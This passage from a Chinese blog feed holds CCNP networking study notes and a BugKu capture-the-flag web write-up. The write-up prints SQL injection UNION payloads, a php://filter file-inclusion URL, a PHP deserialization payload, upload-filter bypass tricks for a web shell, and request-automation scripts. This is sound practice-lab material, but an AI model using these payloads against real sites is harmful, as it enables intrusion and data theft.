    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="前端" scheme="http://blog.dvkunion.cn/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>CCNP 学习笔记</title>
    <link href="http://blog.dvkunion.cn/2019/03/02/CCNP/"/>
    <id>http://blog.dvkunion.cn/2019/03/02/CCNP/</id>
    <published>2019-03-02T08:52:29.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>CCNP</h1><hr><center><small>2019-3-2</small></center><p>GNS<br>Cisco-packet-tracer<br><br></p><center><small>华丽的分割线</small></center><hr><h3 id="b-0x00-简介和基础-b"><b>0x00- - 简介和基础</b></h3><p>CCNP实际上是一个认证类的考试。CCNP全称是：Cisco Certified Network Professional——思科认证网络高级工程师。</p><p>工作方向：路由交换，安全，ISP服务商，数据中心DC，无线，语音。</p><p><b>网络连通性的两种测试：</b><br>ping:(ICMP)<br>原理：发送Echo request、接收Echo reply</p><p>traceroute:(UDP 33434/33435/33436)<br>原理：TTL值+ICMP错误消息。</p><p><b>网络线缆：</b><br>1.交叉线  568A 568B<br>2.直通线  568B 568B</p><blockquote><p>568B 橙白 橙 绿白 蓝 蓝白 绿 棕白 棕<br>568A 绿白 绿 橙白 蓝 蓝白 橙 棕白 棕<br>不同类型设备之间使用交叉线。<br>相同类型设备之间使用直通线。<br>普通网线只能在100m内通信。</p></blockquote><p>3.console线(反转线，全反线) 连接路由和交换机等设备</p><p>4.串口线：早期广域网链路</p><h3 id="b-0x01-OSI七层模型-b"><b>0x01- - OSI七层模型</b></h3><p><b>ISO：</b><br>国际标准化组织（International Organization for Standardization，ISO）简称ISO，是一个全球性的非政府组织。<br><b>目的：</b><br>1.简化通信网络的复杂性，便于网络的学习。<br>2.为每一个层次定义响应的功能。下层需要为上层提供标准化服务。<br>3.标准化所有厂商的接头和协议。</p><p><b>OSI：</b><br>OSI是Open System Interconnection的缩写，意为开放式系统互联。国际标准化组织（ISO）制定了OSI模型。</p><p>由高到低分别为：</p><ul><li><b>1.应用层(Applacation)： </b>为应用程序提供网络的接口。</li><li><b>2.表示层(Presentation)： </b>进行数据的编码转换、压缩，翻译数据格式。</li><li><b>3.会话层(Session)： </b>区分和控制不同的会话连接。</li></ul><blockquote><p>上三层一般由软件工程师进行考虑与建设。</p></blockquote><ul><li><b>4.传输层(Transport)：</b>提供可靠的连接(TCP)，同时进行数据校验(CRC校验)</li><li><b>5.网络层(Network)：</b> 定义逻辑地址(IP、ISIS)；提供路由的选择并进行维护；以及进行路由<font color='red'>数据包</font>的转发等操作。(路由器、三层交换机)</li><li><b>6.数据链路层(Data Link)：</b>定义物理地址(MAC：media access control)，通过媒介访问控制将<font color='red'>数据帧</font>发送到目的主机。(以太网交换机)</li><li><b>7.物理层(Physical)：</b>为网络提供可靠的传输环境，负责<font color='red'>比特流</font>的发送与接收。(集线器 hub)</li></ul><p>观察上述红色部分可以发现，OSI为每一层定义了数据的单位---<b>PDU</b></p><ul><li><b>上三层：</b>data 数据</li><li><b>传输层：</b>segement 数据段封装</li><li><b>网络层：</b>packet 数据包</li><li><b>数据链路层：</b>frame 数据帧</li><li><b>物理层：</b>bit 比特流：由0、1构成的一长串二进制。</li></ul><p><b>集线器被替代的原因：</b></p><blockquote><p>冲突域：如果在一个网络的两台计算机在通信时会发生冲突，则这个网络就是一个冲突域。会导致数据帧的破损。</p></blockquote><blockquote><p>广播域：广播的范围。<br>集线器所有接口在一个冲突域。<br>交换机的一个接口就是一个冲突域。<br>交换机所有的接口都在一个广播域。<br>路由器一个接口就是一个广播域。</p></blockquote><h3 id="b-0x02-TCP-IP协议簇-b"><b>0x02- - TCP/IP协议簇</b></h3><p><b>协议：</b><br>网络协议的简称，网络协议是通信计算机双方必须共同遵从的一组约定。<br><b>TCP/IP协议：</b><br>互联网协议（Internet Protocol Suite）是一个网络通信模型，以及一整个网络传输协议家族，为互联网的基础通信架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），简称TCP/IP。<br>一般分为五层或四层：</p><ul><li><b>1.应用层：</b>FTP(21)、Telnet(23)、Http(80)、Smtp(25)、DNS(53)、RIP(路由信息协议 520)、Snmp(简单网络管理协议 161)、Tftp(简单文件传输协议 69)。</li><li><b>2.传输层：</b>TCP(transmission control protocol)、UDP(user datagram protocol)</li></ul><blockquote><p>TCP是面向连接(发送数据之前建立连接，发送数据时维护连接，发送数据结束拆除连接)、可靠的用户传输协议。<br>TCP通过 &quot;三次握手&quot; 建立连接; &quot;四次握手&quot;拆除连接。<br>UDP是非面向连接，不可靠的传输协议。</p></blockquote><ul><li><b>3.网络层：</b>IP(internet protocol):、ICMP：(Internet control management protocol);ARP/RARP ()地址解析协议/地址反向解析协议。</li><li><b>4.数据链路层：</b>以太网协议；HDLC协议；PPP协议。</li><li><b>5.物理层(4、5整合可以称为网络接口层)</b></li></ul><p><b>TCP包头：(20 bytes)</b><br>Source port(16 b);<br>Destination port (16 b);</p><blockquote><p>这两部分用于区分上层应用层协议。<br>1-1023：知名端口。保留给知名的应用层协议<br>1024-65535：随机高端口。 发送方随机高端口向目的主机的特定端口发起TCP连接。</p></blockquote><p>Sequence number 序列号 (16 b);<br>Acknowledgement number 确认号 (16 b);<br>Data;</p><p><b>UDP包头：(8 bytes)</b><br>Source port(16 b);<br>Destination port (16 b);<br>check num(16 b);<br>(16 b);<br>Data;</p><p><b>IP包头：(unkown Bytes)</b><br>version(4 b);</p><blockquote><p>版本：ipv4 0100; ipv6 0110;</p></blockquote><p>header length(4 b);</p><blockquote><p>头部长度： 范围20byte-60byte之间</p></blockquote><p>Priority &amp; type of service(8 b);</p><blockquote><p>用于区分不同网络流量，实现QOS</p></blockquote><p>Total length(16 b);</p><blockquote><p>总长度：说明四层以后负载的大小。</p></blockquote><p>iDentification(16 b)/Flags(3 b)/flagment offset (13 b)；</p><blockquote><p>标识/标记/偏移量：用来对数据包进行分片。<br>MTU值(最大传输单元) 最大只能传输1500 byte,所以在传输中经常对数据包进行分片。<br>标识：标记同一个数据包。<br>标记：第几个包。<br>偏移量：开始位置。</p></blockquote><p>Time To live(8 b);</p><blockquote><p>限制数据包存活时间(存活范围)，防止数据包环路<br>每经过一台三层设备该值减一<br>常见TTL：255、192、128、64。</p></blockquote><p>Protocl(8 b);</p><blockquote><p>协议号：标记上层(传输层)使用的协议。<br>6：TCP<br>17：UDP<br>1：ICMP<br>2：IGMP internet管理协议</p></blockquote><p>Header checksun(16 b);</p><blockquote><p>头部校验：校验IP数据包头部的完整性。</p></blockquote><p>Source IP Address(32 b);<br>Destination IP Address(32 b);</p><blockquote><p>源IP/目的IP</p></blockquote><p>Options;<br>Data;</p><p><b>ARP协议：</b><br>Win : arp -a<br>Route : show arp<br>arp存放时间是4个小时。</p><p><b>RARP协议：</b></p><p>已经被DHCP取代：software:169.254.0.0/16</p><h3 id="b-0x03-IP与子网掩码-b"><b>0x03- - IP与子网掩码</b></h3><p>IP(Internet Protocol):网络之间的协议<br><b>概念:</b><br>为计算机网络相互连接进行通信而设计的协议。个人把IP理解为在这个网络中每台主机的地址：如，xx省xx市xx街xx小区xxx<br><b>组成：</b><br>网络号+主机位<br>主机位全为0代表网络号：如127.0.0.0<br>主机位全为1代表广播地址：如127.255.255.255<br><b>分类：</b><br>对IP的数据进行分类，有如下：</p><ul><li>A:1.0.0.1-127.255.255.254 适用于超大型网络，可容纳 2^24-2 台主机</li><li>B:128.0.0.1-191.255.255.254 适用于大型网络，可容纳 2^16-2 台主机</li><li>C:192.0.0.1-223.255.255.254 适用于小型网络，可容纳 2^8-2 台主机</li></ul><blockquote><p>A、B、C三种被称作单播IP地址。两台主机想要网络互通必须IP地址为这三类</p></blockquote><ul><li>D:224.0.0.1-239.255.255.254 此类地址没有网络号和主机位的概念，用于组播标识组号。</li><li>E:240.0.0.1-255.255.255.254 保留地址，多用于科研。</li></ul><p>对IP的使用进行分列，有如下：</p><p>公网IP：<br>除私网地址以外的IP地址</p><p>私网地址：<br>10.0.0.0-10.255.255.255<br>172.16.0.0-172.31.255.255<br>192.168.0.0-192.168.255.255</p><p>私网地址优点：<br>提高网络安全性，节约IPv4网络空间</p><p><b>子网掩码：</b><br>子网掩码是用来判断任意两台主机是否属于同一个子网络。<br>子网掩码与IP一一对应，为32bit。<br>子网掩码<br>VLSM 可变长子网掩码：<br>例--将10.1.1.0/24划分为两个子网，可以通过这样的方式--向主机位借位作为网络位:<br>10.1.1.0/25<br>10.1.1.128/25</p><h3 id="b-0x04-路由设备与基本路由协议-b"><b>0x04- - 路由设备与基本路由协议</b></h3><p>路由器作用：可以实现不同网段之间的互联和互通。<br>路由：路由器收到IP数据包，去查找路由信息进行转发的过程。<br>路由信息：去往目的网络的一条信息，指明了去往目的网络的方向。<br>路由表：存放路由信息的表。<br>路由表存放的信息：目的地址网络号，子网掩码，下一跳地址，出接口，路由的类型，AD 管理距离，Metric 开销。</p><p>路由器依据路由表转发IP数据包，当路由表内不存在匹配的路由时，路由器就会丢弃该数据包。</p><p>路由分类：<br>直连路由和非直连路由</p><p>直连路由：指物理上直接连接的路由。会随着接口状态的改变而消失。</p><p>非直连路由：指物理上没有直接连接的路由。非直连路由又分为 静态路由 和 动态路由两种。</p><p>静态路由：人为手工在路由上进行配置路由信息的路由。</p><p>动态路由：主要有两个协议：距离矢量路由协议、链路状态路由协议。</p><p>距离矢量路由协议：RIP EIGRP BGP 基于流言的协议</p><p>链路状态路由协议：OSPF ISIS 地图协议</p><p>从协议的工作范围，路由器可以分为IGP路由、EGP路由。</p><p>IGP：RIP EIGRP ISIS内部网关工作协议  一个区域内内部运行的路由协议</p><p>EGP：BGP OSPF外部网关工作协议  在区域系统之间运行的路由协议</p><p>早期分类：<br>有类路由协议：RIP　IGRP (主类路由 A:X.0.0.0/8 B:Y.Y.0.0/16)</p><p>无类路由协议：EOGRP OSPF ISIS BGP(无类别路由,携带子网掩码)</p><p>查表原则：<br>1.最长掩码匹配原则。<br>2.递归查询原则。</p><p>AD管理距离</p><p>C-----0<br>S-----1<br>RIP---120<br>EIGRP-90/170/5<br>OSPF--110<br>ISIS--115<br>BGP---20/200<br>255---过滤</p><p>作用：从不同的路由协议学习到的相同的路由条目，比较进行管理。</p><p>Metric开销：<br>比较同一种协议去往目的网络的开销</p><p><b>静态路由</b></p><p>由管理员手工配置的路由条目</p><p>配置语法：</p><p><code>ip route 网络号 子网掩码 出接口/下一跳地址</code></p><p>既要配置转发echo request的路由表，也要配置echo reply的路由表。</p><p>如果是以太网形式，静态路由尽可能跟下一跳地址。(代理ARP):no ip proxy-arp<br>如果是串行链路，既可以跟下一跳，也可以跟出接口。</p><p>静态路由全网联通：每一台路由都要配置与自己非直连路由的静态路由。</p><p>静态路由特例：<br>默认路由：ip route 0.0.0.0 0.0.0.0 出接口/下一跳地址。<br>一般用作网络的出口。</p><p>浮动静态路由：通过修改静态路由的管理实现备份。<br>若存在两条静态路由容易构成负载均衡。浮动静态路由可以做到另一条路由作为另一条的备份。<br>当其中一条路径出现问题，备份路径则生效。</p><p>总结：<br>优点：配置简单、CPU不需要计算路由条目、稳定。<br>缺点：不适用于大型网络、不能适应网络拓扑的变化、消耗网络资源。</p><p><b>动态路由<br>路由器自动形成路由表，自动适应网络拓扑变化。</p><p>RIP:(Routing Information Protocol)<br>特点：<br>1.属于IGP，典型的DV协议(没有拓扑概念)<br>2.基于UDP协议，端口是520 RIP|UDP 502|IP 17<br>3.周期性以广播/组播的方式发送路由更新。<br>4.完整更新，路由表里面的路由条目。<br>5.算法-贝尔曼福特算法：使用跳数坐座位rip的度量值。<br>6.支持等价的负载均衡(去往目的由多个路径，路由metric相同)。<br>7.Rip有两个版本：RIPv1,RIPv2。</p><p>RIPv1:<br>1.有类别的路由协议(不携带子网掩码)<br>2.广播的方式发送路由更新 广播地址:255.255.255.255<br>3.在主类边界自动汇总<br>4.不能支持VLSM(可变长子网掩码)<br>5.不能支持路由认证和打标<br>6.不能支持第三方下一跳次优路径(重分布)<br>7.不支持不连续子网,</p><p>RIPv2:</p><p>router rip 进入到rip进程<br>version 1 选择版本<br>Network 宣告原则：按主类的方式进行宣告。<br>例：network 192.168.1.0 172.16.0.0<br>含义：被network包含的路由器上所有被激活的接口启RIP进程。</p><p><code>show ip protocols</code></p><p>接口所属的网段放进rip的数据库。</p><p><code>show ip rip database</code></p><p>利用辅助地址构建连续子网。<br>一个接口下可以配多个辅助地址。</p><p><code>ip address 地址 掩码 secondary</code></p><p><code>show ip int brief</code></p><p>1，路由器模式详解：<br>Router&gt; 用户模式，通常用来查看统计信息，但不能修改路由器的设置。<br>Router# 特权模式，可以查看并修改路由器的配置，通常在这里运行show命令。<br>Router(config)# 全局模式，在这里修改当前运行配置中的内容。<br>Router(config-if)# 接口模式，用来配置路由器的物理接口和环回接口。<br>Router(config-line)# 控制台接口模式<br>Router(config-subif)#  子接口模式，用来配置在路由器中创建的逻辑接口.<br>Router(config-router)#  路由协议接口模式，在这里配置路由协议，如RIP、OSPF、IGRP等。</p><p>2，登录cisco设备必要的配置：<br>Router&gt;enable  //进入特权模式<br>Router#configure terminal   //进入全局模式<br>Router(config)#hostname R1    //配置路由器的主机名<br>R1(config)#no ip domain-lookup  //关闭动态的域名解析,作用是当我们输入错误命令的时候，路由器会认为这条命令没有错误，它只是一个域名的形式，路由器会进行解析，从而浪费宝贵的时间。<br>R1(config)#line console 0    //进入控制台<br>R1(config-line)#exec-timeout 0 0  //关闭控制台的会话超时，也可用命令no exec-timeout，当长时间不去操作路由器的时候，路由器会自动的终止与我们的对话连接，跳转到非连接状态，此时需要输入enable重新进入特权模式，对我们的操作十分的不方便。<br>R1(config-line)#logging synchronous //关闭日志同步，抑制控制台的提示信息，使得路由器发送的控制台屏幕的消息不会附加到命令行中。</p><p>3，cisco设备的基本配置<br>Router(config)#hostname NGR1  //修改路由器主机名<br>Router#clock set 13:01:01 10 july 2007配置路由器时间：<br>Router#show clock   //查看路由器当前时间<br>Router(config)#enable password cisco //  特权模式的明文密码<br>Router(config)#enable secret cisco  // 特权模式的密文密码<br>Router(config)#service password-encryption<br>//将路由器中所有明文密码变为加密的形式<br>Router#copy running-config startup-config  保存路由器当前配置</p><p>VTY口的配置<br>Router(config)#line vty 0 4<br>Router(config-line)#password [password]<br>Router(config-line)#login<br>Router(config-line)#exit</p><p>配置以太网接口地址<br>Router#conf  t<br>Router(config)#interface E0/0  进入接口<br>Router(config-if)#ip address 192.168.1.1 255.255.255.0  //配置IP地址<br>Router(config-if)#no shutdown  //激活该接口</p><p>配置串行接口（需要配置时钟频率）<br>Router#conf  t<br>Router(config)#interface S0<br>Router(config-if)#clock rate 64000 //DCE 设备配置时钟，DTE设备不用配置。<br>Router(config-if)#ip address 192.168.1.1 255.255.255.0   //配置IP地址<br>Router(config-if)#no shutdown</p><p>4常用的show命令：<br>Router#show running-config     查看路由器运行配置文件<br>Router#show ip interface s0/0    查看接口协议相关信息<br>Router#show ip route     查看路由信息。<br>Router#show version      查看路由器版本<br>Router#show flash:        查看路由器flash<br>Router#show history           查看历史命令记录<br>Router#show arp     查看路由器ARP表<br>Router#show clock    查看路由器的时间设置<br>Router#show ip interface brief     查看接口简要信息<br>Router#show interfaces s0/0     查看接口物理相关信息<br>Router#show users     查看当前所有连接到路由器的用户<br>Router#show session     查看会话记录，经常在终端上使用<br>Router#show controllers s0/0    查看特定接口的硬件信息<br>Router#show ip protocols     查看全局和接口的第三层协议的特定状态<br>Router#show startup-config    查看下次路由器重新加载时将要使用的配置<br>Router#show cdp neighbors    CDP思科发现协议，查看直连的相邻设备及其详细信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CCNP&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2019-3-2&lt;/small&gt;&lt;/center&gt;
&lt;p&gt;GNS&lt;br&gt;
Cisco-packet-tracer&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/small&gt;&lt;/cente</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="计算机网络" scheme="http://blog.dvkunion.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="思科认证" scheme="http://blog.dvkunion.cn/tags/%E6%80%9D%E7%A7%91%E8%AE%A4%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>BugKu</title>
    <link href="http://blog.dvkunion.cn/2019/02/26/BugKu/"/>
    <id>http://blog.dvkunion.cn/2019/02/26/BugKu/</id>
    <published>2019-02-26T22:20:40.000Z</published>
    <updated>2023-11-03T21:25:20.028Z</updated>
    
    <content type="html"><![CDATA[<h1>BugKu</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言</b></h3><p>久仰BugKu大名，这里记一下Bugku的题目。</p><h3 id="b-0x01-Web-b"><b>0x01- - Web</b></h3><p><b>01-web2</b></p><p>打开是加速的滑稽js....<br>F12得到key,一样的签到题套路</p><p><b>02-计算器</b></p><p>打开是一个验证码一样的计算图片，但是一般的结果都是两位数以上而输入框只能输入1位。<br>右键审查元素直接修改html属性即可。</p><p><b>03-web基础$_GET</b></p><p>打开是一段源码。<br>要求GET方法获得一个what变量的值为flag。<br>url添加?what=flag即可。</p><p><b>04-web基础$_POST</b></p><p>同上题目，方法变为了POST。<br>上hackbar直接可以拿到flag。</p><p><b>05-矛盾</b></p><p>又是一段php。<br>GET得到num,要求num是非数字(!is_numeric)但是只有num==1才能够输出flag。<br>这里num==1是弱类型，所以我们只要输入一个带有字母且开头为1的字符串即可。</p><p><b>06-web3</b></p><p>打开疯狂js弹窗。<br>两种方式:第一禁用浏览器js,F12即可看到flag的注释。<br>第二直接view-source，看到注释掉的html编码的flag。</p><p><b>07-域名解析</b></p><p>按照题目提示修改host文件(Linux:/etc/hosts Win:C:\windows\system32\drivers\etc)即可。<br>大佬说BP改一下host也可以实现。</p><p><b>08-你必须让他停下</b></p><p>打开题目1s一次自动刷新。<br>同样禁用js手动刷出flag即可。<br>BP抓包后手动GO几次也能获得。</p><p><b>09-本地包含</b></p><p>打开只有一个123,按照题目提示是一个LIF。<br>直接盲猜flag.php即可。。。</p><blockquote><p>p.s:看了一下别人的wp发现原题好像不是这样的，，，给了一个源码...<br>include &quot;flag.php&quot;;<br>$a = @$_REQUEST['hello'];<br>eval( &quot;var_dump($a);&quot;);<br>show_source(__FILE__);</p></blockquote><p><b>10-变量1</b></p><p>这题没做出来，缺少了对php 可变变量的知识。<br>题目是一段源码，提示flag在一个变量中，要求GET一个arg值，arg是一个可变变量。<br>让arg=GLOBALS输出全局变量即可。</p><p><b>11-web5</b></p><p>打开有一个输入框，提示JSfuck，F12查看源码发现隐藏的jsfuck。<br>这里有一个坑点，F12看到的是省略后的代码，无法运行。<br>使用view-source查看源码，得到源码扔console台即可。</p><p><b>12-头等舱</b></p><p>。。。看到带有头、head的东西，直接F12条件反射network。<br>看请求包即可得到flag。</p><p><b>13-网站被黑</b></p><p>这题也搞了很久。。。题目提示是一个很没水平的东西???<br>做的时候因为打开后就没啥提示，没有啥思路。<br>扔扫描器扫去把，直接扫到了一个后台。<br>要输入密码。<br>没提示我上哪弄密码去。。。<br>继续扔工具爆破去吧。<br>得到密码拿到flag...</p><blockquote><p>的确很坑。</p></blockquote><p><b>14-管理员系统</b></p><p>打开发现是一个登录窗口，F12发现一个base64注释。解出来是test123。<br>尝试admin登陆，结果有IP限制。<br>改xff即可得到flag。</p><p><b>15-web4</b></p><p>打开提示看看源码，F12启动。<br>看到一串js，都是%扔url解一下。<br>得到的是一个js函数。<br>有一个坑点，注意p1和p2的拼接部分插入了一段，所以密码应该是p1的结尾+插入部分+p2开头。</p><p><b>16-flag在index里</b></p><p>打开是一个触发连接。由题目提示flag在index里面，应该是让我们去查看index.php的内容。<br>点击click之后发现跳转的url是明显的符合LFI漏洞的形式。我们尝试去查看index.php但是没有显示出来。<br>尝试使用php://filter封装成base64进行查看。</p><p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>直接base64解码得到flag。<br>这里一开始用的是php://input。查看到源码之后发现被过滤掉了input和../以及tp、data等关键词。</p><p><b>17-输入密码查看flag</b></p><p>打开提示是一个5位数字的密码。直接bp爆破。</p><p><b>18-点击100万次</b></p><p>这题做了一次又忘了...<br>有关js的题目也是没有条件反射。<br>点开是一个饼干...要你点击100万次就会得出flag。<br>F12 可以看到饼干计数的js代码。<br>js在计数的时候如果计数到了100万就会发出post请求。我们直接伪造这个请求即可。<br>得到flag。</p><p><b>19-备份是个好习惯</b></p><p>提示有备份。扫描扫出index.php.bak。<br>查看源码，要求得到key1和key2不相同但md5相同。md5判断处为弱类型，0e绕过。<br>有一个坑点，这里他使用str_replace把key替换成了空字符串。因此需要使用url编码进行绕过。</p><p><b>20-成绩单</b></p><p>打开发现一个输入框，输入id查询成绩。<br>fuzz发现存在sql注入漏洞。<br>走流程注入：<br><code>1' order by 4 #</code>检测表单长度<br><code>-1' union select 1,2,3,4 #</code>查看元素位置<br><code>-1' union select 1,database(),user(),version() #</code>获取主要信息<br><code>-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version() #</code>得到表名<br><code>-1' union select 1,(select * from fl4g),user(),version() #</code>直接查询表名得到flag。</p><blockquote><p>回数据库继续熟悉那张特殊的表</p></blockquote><p><b>21-秋名山老司机</b></p><p>打开提示要求在2s内计算一个长串的表达式。<br>python写个eval脚本即可。<br>动手写一下吧...不然一直眼高手低。<br>。。。这么个东西也写了15多分钟。。。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">express=r.text</span><br><span class="line">express=express[<span class="number">159</span>:]</span><br><span class="line">rexp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> express:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">rexp=rexp+i</span><br><span class="line"><span class="built_in">print</span>(rexp)</span><br><span class="line">ans=<span class="built_in">eval</span>(rexp)</span><br><span class="line">r=s.post(url,data=&#123;<span class="string">&#x27;value&#x27;</span>:ans&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><b>22-速度要快</b></p><p>打开页面，抓包发现回复内容内包含flag字段，并且源码带有注释掉的提示:要求post一个margin的值。<br>对flag解码两次base64可以得到后面的几个数字，应该就是margin。<br>但是算出来了之后???要求我快点?<br>行吧...这个页面刷新一次就会更新一次那个flag的值...<br>正好趁着热乎...把上面的py代码在熟练一次吧。<br>注意requests必须使用session请求保持会话连接。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/web6/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">exp=r.headers[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">exp=exp[<span class="number">44</span>:]</span><br><span class="line">exp=base64.b64decode(exp)</span><br><span class="line">exp=base64.b64decode(exp)</span><br><span class="line">exp=exp.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">r=s.post(url,data=&#123;<span class="string">&#x27;margin&#x27;</span>:exp&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>ok,我的字符串操作是真的烂...</p></blockquote><p><b>23-cookies欺骗</b></p><p>打开发现url参数filename存在一个base64的加密。解码为key.txt。是一串不</p><p><b>24-never give up</b></p><p>打开看到url参数以为是注入题目...结果没有反馈sql又不会了...<br>日常F12，得到提示。1p.html转向Bugku的论坛。<br>抓包看一下，发现是一个304 modified。<br>删去转304的请求语句If-Modified得到页面的源码，是一段js的代码。<br>里面有一个很长的变量word。并且在 outword()函数中进行了url解码。<br>手动url解码，得到另一段代码，是实现跳转的js以及注释掉的base64。<br>手动base64解码，又得到了一段php代码....<br>做到这里就想起来怎么做的了。。。这里很坑。<br>看到了一个flag的txt文档，试着访问一下就直接能够得到flag...<br>如果按照实际来做php审计的话，需要绕过下面几个函数：<br>stripos(字符串a，字符串b) 函数查找字符串b在字符串a中第一次出现的位置（不区分大小写）。</p><p>file_get_contents 将整个文件读入一个字符串</p><p>strlen() 函数返回字符串的长度</p><p>!$_GET[‘id’]并且id==0：令id=%00或者令id=.字符串都可以绕过</p><p>substr() 函数返回字符串的一部分。 substr(string,start,length) ，length参数可选。如  substr($b,0,1)  就是在参数b里面 ，从0开始返回1个长度的字符串</p><p>eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)    就是判断&quot;1114&quot;这个字符串里面是否有符合&quot;111&quot;.substr($b,0,1)这个规则的</p><p>这里被坑住了。一直在考虑如何寻找一个编码方式能让substr不识别但是eregi识别出来...<br>这里绕过eregi的方式是用%00截断，使得判断eregi(&quot;111&quot;,&quot;1114&quot;)成立。</p><p>payload:hello.php?id=0e123&amp;a=php://input&amp;b=%0023456</p><p><b>25-welcome to bugku</b></p><p>一个经典的题目<br>打开提示我不是bugku的会员....<br>F12得到注释部分的源码提示。<br>按照源码要求一步一步的走吧...<br>第一个变量txt:考察php://input封装。<br>第二个变量file：考察php://filter封装，根据提示查看hint.php源码。<br>hint内存在一个flag的Class。<br>我们再查看index.php的源码...发现file直接被过滤了...所以我们不能直接读到flag.php<br>但是在后面有一个对password的序列化，结合hint内的class的内容，我们可以构造php反序列化payload。<br><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;,s:8:&quot;flag.php&quot;;&#125;</code><br>作为hint.php的参数进行传输。即可得到Flag</p><p>最后放一个payload:<br><code>index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;,s:8:&quot;flag.php&quot;;&#125;</code></p><p><b>26-过狗一句话</b></p><p>这题已经被日掉了。。。不能做了<br>靠着广大网友的wp大概看一下题目。应该是给的一句话木马。传入参数s即可进行命令执行，寻找flag文件即可。</p><p><b>27-字符?正则?</b></p><p><b>28-前女友</b></p><p>...我不知道为什么这题我做了很久...还是后台更新过了...<br>就很不明白为什么一开始眼瞎的看不到F12源码中的一个提示txt连接。。。<br>查看txt得到提示代码...一个弱类型md5比较，加一个数组绕过strcmp函数。。。<br>...为什么第一次做的时候啥都没看到?</p><p><b>29-login1</b><br>提示sql约束攻击...<br>终于在寒假之后对常见的一些sql攻击有了一定的了解...回过来把这题做掉了。<br>按照提示我们使用Sq约束攻击，首先注册一个用户名为 amdin'# 的用户，设置密码后返回登录，在登陆时候使用admin的用户名和注册时候使用的密码。<br>登陆成功即可拿到flag。</p><p><b>30-你从哪里来</b></p><p>打开链接得到提示：我们是从Google来的吗？<br>修改referer得到Flag。<br>坑点：google用的是https协议...</p><p><b>31-md5 collision</b></p><p>这题bugku的意思应该是直接连接到南邮的题目。。。所以少了题目描述。。。<br>去查南邮的题目会发现给了你源码...只要输入等于他给的md5的值的a即可。。。<br>行吧...</p><p><b>32-程序员本地网站</b><br>要求从本地访问，修改x-forwarded-for即可。</p><p><b>33-各种绕过</b><br>php审计。<br>1.首先url编码id=margin<br>2.数组绕过uname和passwd的sha1加密</p><p><b>34-web8</b><br>依旧是php审计。<br>只要get的ac值和fn-php://input封装传输的值相同即可。</p><p><b>35-细心</b></p><p>题目提示变成admin。<br>但是打开看到的是一个404页面...<br>一开始以为是服务器炸了。<br>抓包看一下，没啥收获。<br>没办法，扫去吧。<br>扫到了一个robots.txt，得到提示：resusl.php<br>然后发现了下一步的提示：x参数要和password相同。。。<br>以为是什么骚操作绕过。。。结果直接盲猜x=admin即可。。。</p><p><b>36-求getshell</b><br>按照要求，需要上传一张image的php。<br>一开始以为是上传一句话菜刀...结果回显会默认把上传的文件转变成随机编码的jpg文件...<br>跟着大佬做...bp抓包之后将Content-Type: Multipart/form-data;像这样改成大写...这样可以过waf。<br>然后使用如下的后缀名php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）...并且将文件的Content-Type修改为image/jpg的格式。<br>即可得到flag。</p><p><b>37-INSERT INTO注入</b></p><p>题目给了源码。源码可以看到两个地方。<br>1:ip的传入值和函数getip()有关，这个函数会将数据包中的HTTP_X_FORWARDED_FOR赋值给ip<br>2:sql执行语句：insert into client_ip (ip) values ('$ip')</p><p><b>38-这是一个神奇的登陆框</b></p><p>熟悉了Sqlmap以后直接这题就跑出来了...工具真香。<br>Post提交的参数中admin_name参数存在注入。<br>直接爆表爆库跑出flag即可...</p><p><b>39-多次</b></p><p><b>40-PHP_encrypt_1</b></p><h3 id="b-0x02-Misc-b"><b>0x02- - 